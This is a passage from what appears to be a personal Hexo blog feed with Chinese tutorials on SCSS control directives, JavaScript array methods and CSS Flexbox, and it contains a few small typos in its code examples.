class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ite7</span>: true;</span><br><span class="line"><span class="variable">$type</span>: m0onster;</span><br><span class="line"><span class="selector-class">.ib</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:inline-block;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$ite7</span> &#123;</span><br><span class="line">        *<span class="attribute">display</span>:inline;</span><br><span class="line">        *zoom:<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$type</span> == ocean &#123;</span><br><span class="line">        <span class="attribute">color</span>: blue;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$type</span> == matador &#123;</span><br><span class="line">        <span class="attribute">color</span>:red;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$type</span> == monster &#123;</span><br><span class="line">        <span class="attribute">color</span>: green;</span><br><span class="line">    &#125; @<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>三目判断<br>语法： if($condition, $if_true, $if_false)<br>三个参数分别表示：条件，条件为真的值，条件为假的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(true, 1px, 2px)  =&gt; 1px </span><br><span class="line">if(false, 1px, 2px) =&gt; 2px</span><br></pre></td></tr></table></figure><p>for 循环<br>for循环有两种形式，分别为：@rot $var from <start> through <end> 和 @for $var from <start> to <end> 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">for</span> <span class="variable">$i</span> from 1 through 3&#123;</span><br><span class="line">    <span class="selector-class">.item-</span>#&#123;<span class="variable">$i</span>&#125; &#123; <span class="attribute">width</span>: <span class="number">2em</span> * <span class="variable">$i</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line">========css</span><br><span class="line"><span class="selector-class">.item-1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-2</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-3</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">6em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span> <span class="variable">$i</span> from 1 to 3 &#123;</span><br><span class="line">    <span class="selector-class">.item-</span>#&#123;<span class="variable">$i</span>&#125; &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">2em</span> * <span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">=========css</span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-2</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></end></start></end></start></p><p>@each循环<br>语法为：@each $var in <list or map>。其中$var表示变量，而list和map表示list的类型数据和map的类型数据。</list></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$animal-list</span>: puma, sea-slug, egret, salamander;</span><br><span class="line">@<span class="keyword">each</span> <span class="variable">$animal</span> in $ <span class="variable">$animal-list</span> &#123;</span><br><span class="line">    .#&#123;<span class="variable">$animal</span>&#125;-<span class="attribute">icon</span> &#123;</span><br><span class="line">        <span class="attribute">background-image</span>: url(<span class="string">'/images/#&#123;$animal&#125;.png'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.puma-icon</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: url(<span class="string">'/images/puma.png'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.sea-slug-icon</span> &#123;</span><br><span class="line">    bnackground-image: url(<span class="string">'/images/sea-slug.png'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSS" scheme="https://jiuylq.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>Array笔记</title>
    <link href="https://jiuylq.github.io/2018/09/07/Array/"/>
    <id>https://jiuylq.github.io/2018/09/07/Array/</id>
    <published>2018-09-07T07:51:28.000Z</published>
    <updated>2019-04-07T05:17:16.587Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结了一些js数组的常用方法<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Array笔记"><a href="#Array笔记" class="headerlink" title="Array笔记"></a>Array笔记</h2><p><img src="/2018/09/07/Array/images/Array.png" alt="简介" title="简介"></p><h3 id="1、创建数组的方法"><a href="#1、创建数组的方法" class="headerlink" title="1、创建数组的方法"></a>1、创建数组的方法</h3><blockquote><p>属性  </p></blockquote><p><strong>length</strong><br>　　length属性表示数组的长度，即其中元素的个数。<br>JavaScript数组的length属性是可变的，当length属性被设置得更大时，整个数组的状态事实上不会发生变化，仅仅是length属性变大；当length属性被设置得比原来小时，则原先数组中索引大于或等于length的元素的值全部被丢失。  </p><p><strong>prototype</strong><br>　　返回对象类型原型的引用。prototype 属性是 object 共有的。<br>一般用来给数组实例添加方法。  </p><p><strong>constructor</strong><br>　　表示创建对象的函数。<br>　　说明：constructor 属性是所有具有 prototype 的对象的成员。constructor 属性保存了对构造特定对象实例的函数的引用。</p><h3 id="1-1-使用Array构造函数"><a href="#1-1-使用Array构造函数" class="headerlink" title="1.1 使用Array构造函数:"></a>1.1 使用Array构造函数:</h3><pre><code class="javascript"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(); <span class="comment">//创建一个空数组</span><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>); <span class="comment">//创建一个包含10个项的数组</span><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"lily"</span>,<span class="string">"lucy"</span>,<span class="string">"Tom"</span>); <span class="comment">//创建一个包含3个字符串的数组</span></code></pre><h3 id="1-2-使用数组字面量："><a href="#1-2-使用数组字面量：" class="headerlink" title="1.2 使用数组字面量："></a>1.2 使用数组字面量：</h3><pre><code class="javascript"><span class="keyword">var</span> arr4 = []; <span class="comment">//创建一个空数组</span><span class="keyword">var</span> arr5 = [<span class="number">10</span>]; <span class="comment">//创建一个包含包含10的数组</span><span class="keyword">var</span> arr6 = [<span class="string">"lily"</span>,<span class="string">"lucy"</span>,<span class="string">"Tom"</span>]; <span class="comment">//创建一个包3个字符串的数组</span></code></pre><h3 id="1-3-使用Array-of-创建数组"><a href="#1-3-使用Array-of-创建数组" class="headerlink" title="1.3 使用Array.of()创建数组"></a>1.3 使用Array.of()创建数组</h3><pre><code class="javascript"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.of(<span class="number">7</span>);       <span class="comment">// 创建数组并赋值 [7] </span><span class="keyword">var</span> arr = <span class="built_in">Array</span>.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 创建数组并赋值 [1, 2, 3]</span></code></pre><h2 id="2-检测数组"><a href="#2-检测数组" class="headerlink" title="2 检测数组"></a>2 检测数组</h2><pre><code class="javascript"><span class="comment">//判断一个对象是否时数组</span><span class="keyword">var</span> arr = [];<span class="keyword">if</span>(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>){} <span class="comment">//方法一</span><span class="keyword">if</span>(<span class="built_in">Object</span>.prototype.toString.call(arr) == <span class="string">'[object Array]'</span>){} <span class="comment">//方法二</span><span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(arr)){} <span class="comment">//方法四</span><span class="keyword">if</span>(arr.constructor == <span class="built_in">Array</span>){} <span class="comment">//方法四</span></code></pre><h2 id="3-数组方法-isArray-from-of"><a href="#3-数组方法-isArray-from-of" class="headerlink" title="3 数组方法  isArray, from, of"></a>3 数组方法 <font size="3"> isArray, from, of</font></h2><p><strong>Array.isArray(obj)</strong><br>　　检测对象是否是A容榕阿姨，是则返回true,否则返回false。  </p><p><strong>Array.from(arrayLike,mapFn,thisArg)</strong><br>　　该方法从一个类数组或可迭代对象创建一个新的数组实例。参数arrayLike是想要转换成真实数组的类数组对象或可遍历对象。mapFn是可选参数，如果指定了该参数，则最后生成的数组会经过该函数的加工处理后再返回。thisArg时可选参数，为执行mapFn函数时this的值。<br>　　所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转换为数组。<br>　　实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的 arguments 对象。  </p><pre><code class="javascript"><span class="keyword">let</span> arrayLike = {    <span class="number">0</span>:<span class="string">'a'</span>,    <span class="number">1</span>:<span class="string">'b'</span>,    <span class="number">2</span>:<span class="string">'c'</span>,    length:<span class="number">3</span>};<span class="keyword">let</span> arrayLike2 = {<span class="attr">length</span>:<span class="number">3</span>};<span class="keyword">let</span> str = <span class="string">'abc'</span>;<span class="keyword">let</span> newArray = <span class="built_in">Array</span>.from(arrayLike) <span class="comment">//['a','b','c']</span><span class="keyword">let</span> newArray2 = <span class="built_in">Array</span>.from(arrayLike, (v) =&gt; v+<span class="string">'1'</span>) <span class="comment">//['a1','b1','c1']</span><span class="keyword">let</span> newArray3 = <span class="built_in">Array</span>.from(arrayLike2) <span class="comment">//[undefined,undefined,undefined]</span><span class="keyword">let</span> newArray4 = <span class="built_in">Array</span>.from(str) <span class="comment">//['a','b','c']</span></code></pre><p><strong>Array.of(item…)</strong><br>　　该方法用于创建数组实例。该方法用于代替Array()或new Array().Array.or()和Array构造函数之间的区别在于处理整数参数：Array.of(6)创建一个具有单个元素6的数组，而Array(6)则创建一个包含6个undefined元素的数组。  </p><pre><code class="javascript"><span class="built_in">Array</span>.of(<span class="number">7</span>);       <span class="comment">// [7] </span><span class="built_in">Array</span>.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// [1, 2, 3]</span><span class="built_in">Array</span>(<span class="number">7</span>);          <span class="comment">// [ , , , , , , ]</span><span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// [1, 2, 3]</span></code></pre><h3 id="数组实例"><a href="#数组实例" class="headerlink" title="数组实例　　"></a>数组实例　　</h3><p>　　所有数组实例都会从Array.prototype继承属性和方法。修改Array的原型会影响到所有的数组实例。  </p><blockquote><p>属性</p></blockquote><p><strong>Array.prototype.constructor</strong><br>　　所有的数组实例都继承了这个属性，它的值就是 Array，表明了所有的数组都是由 Array 构造出来的。  </p><p><strong>Array.prototype.length</strong><br>　　上面说了，因为 Array.prototype 也是个数组，所以它也有 length 属性，这个值为 0，因为它是个空数组。  </p><blockquote><p>方法</p></blockquote><p><strong>修改器方法</strong><br>下面的这些方法会改变调用它们的对象自身的值：  </p><p><strong>push()</strong><br>push()方法将一个或多个元素添加到数组的末尾，并返回新数组的长度  </p><blockquote><p>语法<br>arr.push(element1, …, elementN)<br>返回值：返回新的数组的长度。</p></blockquote><blockquote><p><em>添加元素到数组</em><br><code>`</code>javascript<br>var sports = [“soccer”, “baseball”];<br>var total = sports.push(“football”, “swimming”);</p></blockquote><p>console.log(sports);<br>// [“soccer”, “baseball”, “football”, “swimming”]</p><p>console.log(total);  // 4</p><pre><code>&gt;*合并两个数组*  使用 apply() 添加第二个数组的所有元素  ```javascriptvar vegetables = [&apos;parsnip&apos;, &apos;potato&apos;];var moreVegs = [&apos;celery&apos;, &apos;beetroot&apos;];// 将第二个数组融合进第一个数组// 相当于 vegetables.push(&apos;celery&apos;, &apos;beetroot&apos;);Array.prototype.push.apply(vegetables, moreVegs);console.log(vegetables); // [&apos;parsnip&apos;, &apos;potato&apos;, &apos;celery&apos;, &apos;beetroot&apos;]</code></pre><p><strong>pop()</strong>  </p><p>pop()方法从数组中删除最后一个元素，并返回该元素的值。吃方法更改数组的长度。  </p><blockquote><p>语法<br>arr.pop()<br>返回值：从数组中删除的元素(当数组为空时返回undefined)。</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];arr.length; <span class="comment">// 3</span>arr.pop(); <span class="comment">// 3</span><span class="built_in">console</span>.log(arr); <span class="comment">// [1, 2]</span>arr.length; <span class="comment">// 2</span></code></pre><p><strong>unshift()</strong>  </p><p>unshift()方法将一个或多个元素添加到数组的开头，并返回新数组的长度。  </p><blockquote><p>语法<br>arr.unshift(element1, …, elementN)<br>返回值：返回新数组的长度</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];arr.unshift(<span class="number">4</span>,<span class="number">5</span>);<span class="built_in">console</span>.log(arr) <span class="comment">//[4,5,1,2,3]</span></code></pre><p><strong>shift()</strong>  </p><p>shift()方法从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。  </p><blockquote><p>语法<br>arr.shift()<br>返回值：从数组中删除的元素；(当数组为空时返回undefined)</p></blockquote><pre><code class="javascript"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="keyword">let</span> arr2 = arr1.shift();<span class="built_in">console</span>.log(arr1); <span class="comment">//[2,3]</span><span class="built_in">console</span>.log(arr2); <span class="comment">//1</span></code></pre><p><strong>splice()</strong>  </p><p>splice()方法通过删除现有的元素或添加新元素来更改一个数组的内容（在任意的位置给数组添加或删除任意个元素）。  </p><blockquote><p>语法<br>array.splice(start[, deleteCount[, item1[, item2[, …]]]])  </p></blockquote><blockquote><p>参数<br><em>start</em><br>　　指定修改的开始位置（从0计数）。如果超出了数组的长度，则从数组末尾开始添加内容；如果是负值，则表示从数组末位开始的第几位（从-1计数）；若只使用start参数而不使用deleteCount、item，如：array.splice(start) ，表示删除[start，end]的元素。<br><em>deleteCount 可选</em><br>　　整数，表示要移除的数组元素的个数。如果 deleteCount 是 0，则不移除元素。这种情况下，至少应添加一个新元素。如果 deleteCount 大于start 之后的元素的总数，则从 start 后面的元素都将被删除（含第 start 位）。<br>如果deleteCount被省略，则其相当于(arr.length - start)。<br><em>item1, item2, … 可选</em><br>　　要添加进数组的元素,从start 位置开始。如果不指定，则 splice() 将只删除数组元素。<br>splice方法使用deleteCount参数来控制是删除还是添加：<br>start参数是必须的，表示开始的位置（从0计数），如：start=0从第一个开始；start&gt;= array.length-1表示从最后一个开始。<br>①、从start位置开始删除[start，end]的元素。<br>array.splice(start)<br>②、从start位置开始删除[start，Count]的元素。<br>array.splice(start, deleteCount)<br>③、从start位置开始添加item1, item2, …元素。<br>array.splice(start, 0, item1, item2, …)   </p></blockquote><pre><code class="javascript"><span class="keyword">var</span> months = [<span class="string">'Jan'</span>, <span class="string">'March'</span>, <span class="string">'April'</span>, <span class="string">'June'</span>];months.splice(<span class="number">1</span>, <span class="number">0</span>, <span class="string">'Feb'</span>);<span class="comment">// inserts at 1st index position</span><span class="built_in">console</span>.log(months);<span class="comment">// expected output: Array ['Jan', 'Feb', 'March', 'April', 'June']</span>months.splice(<span class="number">4</span>, <span class="number">1</span>, <span class="string">'May'</span>);<span class="comment">// replaces 1 element at 4th index</span><span class="built_in">console</span>.log(months);<span class="comment">// expected output: Array ['Jan', 'Feb', 'March', 'April', 'May']</span></code></pre><p><strong>sort()</strong><br>sort() 方法对数组的元素进行排序，并返回数组。 sort 排序不一定是稳定的。默认排序顺序是根据字符串Unicode码点。  </p><blockquote><p>语法<br>arr.sort()<br>arr.sort(compareFunction)<br><em>compareFunction</em><br>　　可选。用来指定按某种顺序进行排列的函数。如果省略，元素按照转换为的字符串的各个字符的Unicode位点进行排序。<br>返回值：返回排序后的数组。原数组已经被排序后的数组代替  </p></blockquote><pre><code class="javascript"><span class="comment">//数组排序</span><span class="keyword">var</span> arr = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>]arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>{    <span class="keyword">return</span> a - b}) <span class="comment">// [1,2,3,4,5]</span><span class="comment">//对象可以按照某个属性排序：</span><span class="keyword">var</span> items = [  { <span class="attr">name</span>: <span class="string">'Edward'</span>, <span class="attr">value</span>: <span class="number">21</span> },  { <span class="attr">name</span>: <span class="string">'Sharpe'</span>, <span class="attr">value</span>: <span class="number">37</span> },  { <span class="attr">name</span>: <span class="string">'And'</span>, <span class="attr">value</span>: <span class="number">45</span> },  { <span class="attr">name</span>: <span class="string">'The'</span>, <span class="attr">value</span>: <span class="number">-12</span> },  { <span class="attr">name</span>: <span class="string">'Magnetic'</span> },  { <span class="attr">name</span>: <span class="string">'Zeros'</span>, <span class="attr">value</span>: <span class="number">37</span> }];<span class="comment">// sort by value</span>items.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>{  <span class="keyword">return</span> (a.value - b.value)});<span class="comment">// sort by name</span>items.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>{  <span class="keyword">var</span> nameA = a.name.toUpperCase(); <span class="comment">// ignore upper and lowercase</span>  <span class="keyword">var</span> nameB = b.name.toUpperCase(); <span class="comment">// ignore upper and lowercase</span>  <span class="keyword">if</span> (nameA &lt; nameB) {    <span class="keyword">return</span> <span class="number">-1</span>;  }  <span class="keyword">if</span> (nameA &gt; nameB) {    <span class="keyword">return</span> <span class="number">1</span>;  }<span class="comment">// names must be equal</span>  <span class="keyword">return</span> <span class="number">0</span>;});</code></pre><p><strong>reverse()</strong><br>reverse()方法讲述组中的元素位置颠倒。  </p><blockquote><p>语法<br>arr.reverse()  </p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>];<span class="keyword">var</span> reversed = array1.reverse(); <span class="built_in">console</span>.log(array1);<span class="comment">// expected output: Array ['three', 'two', 'one']</span><span class="built_in">console</span>.log(reversed);<span class="comment">// expected output: Array ['three', 'two', 'one']</span></code></pre><p><strong>fill()</strong><br>fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。  </p><blockquote><p>语法<br>arr.fill(value[, start[, end]])  </p></blockquote><blockquote><p>参数<br><em>value</em><br>用来填充数组元素的值。<br><em>start 可选</em><br>起始索引，默认值为0。<br><em>end 可选</em><br>终止索引，默认值为 this.length。  </p></blockquote><blockquote><p>返回值：修改后的数组</p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];<span class="comment">// fill with 0 from position 2 until position 4</span><span class="built_in">console</span>.log(array1.fill(<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>));<span class="comment">// expected output: [1, 2, 0, 0]</span><span class="comment">// fill with 5 from position 1</span><span class="built_in">console</span>.log(array1.fill(<span class="number">5</span>, <span class="number">1</span>));<span class="comment">// expected output: [1, 5, 5, 5]</span><span class="built_in">console</span>.log(array1.fill(<span class="number">6</span>));<span class="comment">// expected output: [6, 6, 6, 6]</span></code></pre><p><strong>copyWithin()</strong><br>copyWithin() 方法浅复制数组的一部分到同一数组中的另一个位置，并返回它，而不修改其大小。  </p><blockquote><p>语法<br>arr.copyWithin(target[, start[, end]])  </p></blockquote><blockquote><p>参数<br><em>target</em><br>　　0 为基底的索引，复制序列到该位置。如果是负数，target 将从末尾开始计算。<br>　　如果 target 大于等于 arr.length，将会不发生拷贝。如果 target 在 start 之后，复制的序列将被修改以符合 arr.length。<br><em>start</em><br>　　0 为基底的索引，开始复制元素的起始位置。如果是负数，start 将从末尾开始计算。<br>　　如果 start 被忽略，copyWithin 将会从0开始复制。<br><em>end</em><br>　　0 为基底的索引，开始复制元素的结束位置。copyWithin 将会拷贝到该位置，但不包括 end 这个位置的元素。如果是负数， end 将从末尾开始计算。<br>　　如果 end 被忽略，copyWithin 将会复制到 arr.length。  </p></blockquote><blockquote><p>返回值：改变了的数组。</p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];<span class="comment">// place at position 0 the element between position 3 and 4</span><span class="built_in">console</span>.log(array1.copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>));<span class="comment">// expected output: Array [4, 2, 3, 4, 5]</span><span class="comment">// place at position 1 the elements after position 3</span><span class="built_in">console</span>.log(array1.copyWithin(<span class="number">1</span>, <span class="number">3</span>));<span class="comment">// expected output: Array [4, 4, 5, 4, 5]</span></code></pre><p><strong>访问方法</strong>  </p><p>下面的这些方法会改变调用它们的对象自身的值：  </p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文总结了一些js数组的常用方法&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Javascript" scheme="https://jiuylq.github.io/categories/Javascript/"/>
    
    
      <category term="Array" scheme="https://jiuylq.github.io/tags/Array/"/>
    
  </entry>
  
  <entry>
    <title>Flex布局</title>
    <link href="https://jiuylq.github.io/2018/03/07/Flex/"/>
    <id>https://jiuylq.github.io/2018/03/07/Flex/</id>
    <published>2018-03-07T07:51:28.000Z</published>
    <updated>2019-04-07T05:10:31.072Z</updated>
    
    <content type="html"><![CDATA[<p>Flex布局<br>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Flex-布局"><a href="#Flex-布局" class="headerlink" title="Flex 布局"></a>Flex 布局</h2><blockquote><p><strong>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</strong></p></blockquote><p>一、容器</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//容器设置</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//行内元素也可设置</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br><span class="line">//Webkit 内核的浏览器，必须加上-webkit 前缀。</span><br></pre></td></tr></table></figure><p><em>注意，设为 Flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。</em></p><p>二、容器属性</p><p><em>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 main start，结束位置叫做 main end；交叉轴的开始位置叫做 cross start，结束位置叫做 cross end。项目默认沿主轴排列。单个项目占据的主轴空间叫做 main size，占据的交叉轴空间叫做 cross size。</em></p><p><em>以下 6 个属性设置在容器上。</em></p><blockquote><p>flex-direction || flex-wrap || flex-flow || justify-content || align-items || align-content</p></blockquote><ol><li><p>flex-direction</p><p><strong>flex-direction 属性决定主轴的方向（即项目的排列方向）。</strong></p><ul><li>row（默认值）：主轴为水平方向，起点在左端。</li><li>row-reverse：主轴为水平方向，起点在右端。</li><li>column：主轴为垂直方向，起点在上沿。</li><li>column-reverse：主轴为垂直方向，起点在下沿。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-wrap</p><p><strong>默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap 属性定义，如果一条轴线排不下，如何换行。</strong></p><ul><li>nowrap（默认）：不换行。</li><li>wrap：换行，第一行在上方。</li><li>wrap-reverse：换行，第一行在下方。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-flow</p><p><strong>flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>justify-content</p><p><strong>justify-content 属性定义了项目在主轴上的对齐方式。</strong><br><em>它可能取 5 个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。</em></p><ul><li>flex-start（默认值）：左对齐</li><li>flex-end：右对齐</li><li>center： 居中</li><li>space-between：两端对齐，项目之间的间隔都相等。</li><li>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end | center | space-between |</span><br><span class="line">    space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>align-items</p><p><strong>align-items 属性定义项目在交叉轴上如何对齐。</strong></p><p><em>它可能取 5 个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。</em></p><ul><li>flex-start：交叉轴的起点对齐。</li><li>flex-end：交叉轴的终点对齐。</li><li>center：交叉轴的中点对齐。</li><li>baseline: 项目的第一行文字的基线对齐。</li><li>stretch（默认值）：如果项目未设置高度或设为 auto，将占满整个容器的高度。</li></ul></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li><p>align-content</p><p><strong>align-content 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</strong></p><ul><li>flex-start：与交叉轴的起点对齐。</li><li>flex-end：与交叉轴的终点对齐。</li><li>center：与交叉轴的中点对齐。</li><li>space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。</li><li>space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</li><li>stretch（默认值）：轴线占满整个交叉轴。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end | center | space-between |</span><br><span class="line">    space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>三、项目的属性</p><p><em>以下 6 个属性设置在项目上。</em></p><blockquote><p>order || flex-grow || flex-shrink || flex-basis || flex || align-self</p></blockquote><ol><li><p>order</p><p><strong>order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">order</span>: 